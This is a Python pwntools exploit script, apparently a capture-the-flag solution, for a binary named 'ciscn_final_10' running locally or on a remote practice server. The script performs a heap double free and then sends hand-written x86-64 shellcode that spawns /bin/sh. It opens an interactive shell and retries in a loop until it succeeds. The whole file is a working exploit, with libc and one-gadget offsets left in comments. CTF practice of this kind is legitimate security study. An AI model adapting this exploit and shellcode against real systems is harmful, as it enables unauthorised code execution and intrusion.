#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./ciscn_final_10'
context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',28445)
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(a,b):
			io.sendlineafter('> ','1')
			io.sendlineafter('> ',str(a))
			io.sendafter('> ',b)

		def delete():
			io.sendlineafter('> ','2')

		io.sendlineafter('> ','\x00')
		add(0x60,'aaa')
		delete()
		delete()
		add(0x60,'\x90')
		add(0x60,'\x90')
		add(0x60,'The cake is a lie!\x00')
		io.sendline('3')
		shell='''
		xor 	rsi,	rsi			
		push	rsi				
		mov 	rdi,	0x68732f6e69622f	 
		push	rdi
		push	rsp		
		pop	rdi				
		mov 	rax,	59			
		cdq					
		syscall
		'''
		gdb.attach(io)
		pay=asm(shell)
		io.sendline('\x90\x00\x90\x90'+pay)
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# 
		io.interactive()

	except Exception as e:
		io.close()
		continue
	else:
		continue